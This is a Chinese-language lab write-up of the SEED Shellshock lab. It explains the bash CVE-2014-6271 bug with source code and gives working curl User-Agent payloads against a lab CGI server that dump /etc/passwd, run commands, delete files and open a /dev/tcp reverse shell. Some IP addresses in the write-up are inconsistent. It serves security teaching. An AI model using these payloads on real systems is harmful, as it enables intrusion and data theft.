# shellshock原理

shellshock被记录在CVE-2014-6271，具有 9.8 CRITICAL的威胁评分，于2014年9月24日公开发布

简单来说，当父进程fork出子进程的时候，子进程会继承父进程的环境变量，但是由于bash错误的处理机制，导致环境变量被解释成了函数，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行

下面用代码来演示一下

```shell
[04/14/2021 00:28] seed@ubuntu:~$ foo='() { echo "wdnmd"; } ;echo "8848";' # foo是一个字符串
[04/14/2021 00:29] seed@ubuntu:~$ echo $foo
() { echo "wdnmd"; } ;echo "8848"; #打印出字符串foo的内容
[04/14/2021 00:29] seed@ubuntu:~$ export foo #将foo作为环境变量导出
[04/14/2021 00:29] seed@ubuntu:~$ bash #开一个子进程
8848 #这里自动运行了echo 8848命令
[04/14/2021 00:29] seed@ubuntu:~$ declare -f foo
foo () 
{ 
    echo "wdnmd"
}
```

由上可以发现，foo本来是一个shell变量，但是在export foo使其成为环境变量后，在子shell进程中，foo成为了一个函数，并且命令行自动执行了echo "8848"的命令

```
foo='() { echo "wdnmd"; } ;echo "8848";'
foo  () { echo "wdnmd"; } ;echo "8848";
```

shellshock的出现是bash源码中variable.c文件的bug导致的,子进程在传递父进程的环境变量的时候，匹配到() {这四个字符，‘=’会被空格替代，因此就会将其解释为函数

如果字符串是一个函数定义，那么该函数将只解析它，而不执行它。如果字符串包含一个 shell 命令，那么该函数将执行它；倘若该环境变量字符串包含多个用分号；隔开的shell命令，parse_and_execute函数会执行每一条命令

![](/shellshock/image/20210415142147.png)

```c
initialize_shell_variables (env, privmode)
     char **env;
     int privmode;
{
  char *name, *string, *temp_string;
  int c, char_index, string_index, string_length;
  SHELL_VAR *temp_var;

  create_variable_tables ();

  for (string_index = 0; string = env[string_index++]; )
    {

      char_index = 0;
      name = string;
      while ((c = *string++) && c != '=')
	;
      if (string[-1] == '=')
	char_index = string - name - 1;

      /* If there are weird things in the environment, like `=xxx' or a
	 string without an `=', just skip them. */
      if (char_index == 0)
	continue;

      /* ASSERT(name[char_index] == '=') */
      name[char_index] = '\0';
      /* Now, name = env variable name, string = env variable value, and
	 char_index == strlen (name) */

      temp_var = (SHELL_VAR *)NULL;

      /* If exported function, define it now.  Don't import functions from
	 the environment in privileged mode. */
      if (privmode == 0 && read_but_dont_execute == 0 && STREQN ("() {", string, 4))
	{
	  string_length = strlen (string);
	  temp_string = (char *)xmalloc (3 + string_length + char_index);

	  strcpy (temp_string, name);
	  temp_string[char_index] = ' ';
	  strcpy (temp_string + char_index + 1, string);

	  parse_and_execute (temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);

	  /* Ancient backwards compatibility.  Old versions of bash exported
	     functions like name()=() {...} */
	  if (name[char_index - 1] == ')' && name[char_index - 2] == '(')
	    name[char_index - 2] = '\0';

	  if (temp_var = find_function (name))
	    {
	      VSETATTR (temp_var, (att_exported|att_imported));
	      array_needs_making = 1;
	    }
	  else
	    report_error (_("error importing function definition for `%s'"), name);

	  /* ( */
	  if (name[char_index - 1] == ')' && name[char_index - 2] == '\0')
	    name[char_index - 2] = '(';		/* ) */
	}
```

## shellshock攻击CGI程序如何可能

许多 Web 服务器支持 CGI，这是一种用于在 Web 页面和 Web 应用程序上生成动态内容的标准方法。

许多 CGI 程序都是 shell 脚本，因此在实际的 CGI 程序运行之前，将首先调用一个 shell 程序，这样的调用由远程计算机上的用户触发。如果 shell 程序是易受攻击的 bash 程序，我们可以利用易受攻击的 Shellshock 来获得服务器上的特权

当用户将CGI URL发送到Apache Web服务器时，Apache将检查该请求，如果是CGI请求，Apache将使用fork()启动新进程，然后使用exec())函数执行CGI程序

Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会

![](/shellshock/image/20210415142148.png)

## shellshock危害

- 拒绝服务攻击

  - 注入诸如/bin/sleep 20的语句让服务器睡眠
- 远程代码执行
  - 本质上是一种注入攻击
- 影响范围
  - 运行CGI脚本的Apache HTTP 服务器• 
  - 使用CGI作为网络接口的基于Linux的路由器
  - 使用Bash的各种网络服务
  - SSH、DHCP等



# seedlab环境配置

- 设置ip域名映射
  - 在文件/etc/hosts/中追加：`10.9.0.80 www.seedlab-shellshock.com`
  - 其中，10.9.0.80是web服务器容器的ip地址
- 下载实验材料
  - `curl -q https://seedsecuritylabs.org/Labs_20.04/Files/Shellshock/Labsetup.zip -o Labsetup.zip `
- 运行容器
  - 在docker-compose目录运行`docker-compose build`和`docker-compose up`命令，分别对应容器镜像的生成和容器的运行

seed提供的虚拟机默认设置了alias，比如

```
$ dcbuild # Alias for: docker-compose build
$ dcup # Alias for: docker-compose up
$ dcdown # Alias for: docker-compose down
$ dockps // Alias for: docker ps --format "{{.ID}} {{.Names}}"
$ docksh <id> // Alias for: docker exec -it <id> /bin/bash
```

因此我们可以通过docksh <id>进入容器内并运行命令行

下载lab文件

```shell
curl -q https://seedsecuritylabs.org/Labs_20.04/Files/Shellshock/Labsetup.zip -o Labsetup.zip
````

解压

```shell
unzip Labsetup.zip
```

在这个lab中，我们将对 Web 服务器容器发起一次 Shellshock 攻击

# Passing Data to Bash via Environment Variable

为了在基于 bash 的 CGI 程序中利用 shellshock漏洞，攻击者需要将他们的数据传递给易受攻击的 bash 程序，并且数据需要通过一个环境变量传递

使用curl 命令行工具可以允许用户控制 HTTP 请求中的大多数字段

- -v 字段可以打印出 HTTP 请求的头部
- -A：设置User-Agent
- -e：设置Referer
- -H：添加自定义的 HTTP 请求头

```shell
$ curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
$ curl -A "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
$ curl -e "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
$ curl -H "AAAAAA: BBBBBB" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```

使用HTTP Header Live 扩展来捕获 HTTP 请求，可以观察到环境变量

如果命令有一个纯文本输出，并且希望得到输出的返回，那么输出需要遵循一个协议: 它应该以 Content type: text/print 开始，后面跟一个空行，然后可以放置纯文本输出

```
echo Content_type: text/plain; echo; /bin/ls -l
```

```
root@VM:~# cat get_env.sh 
#!/bin/bash
curl -A "my data" -v 10.9.0.80/cgi-bin/getenv.cgi
root@VM:~# ./get_env.sh 
*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to 10.9.0.80 (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: 10.9.0.80
> User-Agent: my data
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 17 Nov 2022 14:43:42 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
< 
****** Environment Variables ******
HTTP_HOST=10.9.0.80
HTTP_USER_AGENT=my data
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at 10.9.0.80 Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=10.9.0.80
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=41716
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
* Connection #0 to host 10.9.0.80 left intact
```



# get the server to send back the content of the /etc/passwd file

```shell
$ curl -A "() { echo hello wdnmd;}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" www.seedlab-shellshock.com/cgi-bin/vul.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```



# get the server to tell you its process’ user ID

```shell
$ curl -A "() { echo hello wdnmd;}; echo Content_type: text/plain; echo; /bin/id" www.seedlab-shellshock.com/cgi-bin/vul.cgi

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


# get the server to create a file inside the /tmp folder

```shell
$ curl -A "() { echo hello wdnmd;}; echo Content_type: text/plain; echo; /bin/touch /tmp/1" www.seedlab-shellshock.com/cgi-bin/vul.cgi
```


# get the server to delete the file that you just created inside the /tmp folder

```shell
$ curl -A "() { echo hello wdnmd;}; echo Content_type: text/plain; echo; /bin/rm /tmp/1" www.seedlab-shellshock.com/cgi-bin/vul.cgi
```

# Question 1: Will you be able to steal the content of the shadow file /etc/shadow from the server?

默认情况下，web服务器使用 Ubuntu 中的 www-data 用户 ID 运行，uid=33(www-data) gid=33(www-data) groups=33(www-data)，因此无法得到影子文件

# Getting a Reverse Shell via Shellshock Attack

## nc

- -l Listen on a specified port and print any data received
- -v Produce more verbose output.
- -n 直接使用IP地址，而不通过域名服务器

攻击端运行`nc -l 9090 -nv`等待reverse shell

攻击端ip：10.9.0.1，docker中web服务器ip：10.9.0.1


被攻击端：

```shell
$  curl -A "() { echo hello wdnmd;}; echo Content_type: text/plain; echo; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" www.seedlab-shellshock.com/cgi-bin/vul.cgi
```

- 被攻击端启动一个 bash shell，它的输入来自一个 TCP 连接，输出到同一个 TCP 连接
- `- i`表示交互式的，interactive
- `> /dev/tcp/10.0.0.1/9090 shell`将输出设备(stdout)被重定向到 TCP 连接到10.0.2.6的端口9090
- `0 < & 1`: 文件描述符0表示标准输入设备(stdin)。此选项告诉系统使用标准输出设备作为标准输入设备。因为 stdout 已经被重定向到 TCP 连接，所以这个选项基本上表明 shell 程序将从相同的 TCP 连接获取它的输入
- `2 > & 1`: 文件描述符2表示标准错误 stderr。这会导致错误输出被重定向到 stdout，也即是 TCP 连接

# 延伸阅读

- https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html

- https://www.zdziarski.com/blog/?p=3905

- https://github.com/jeholliday/shellshock
- https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf

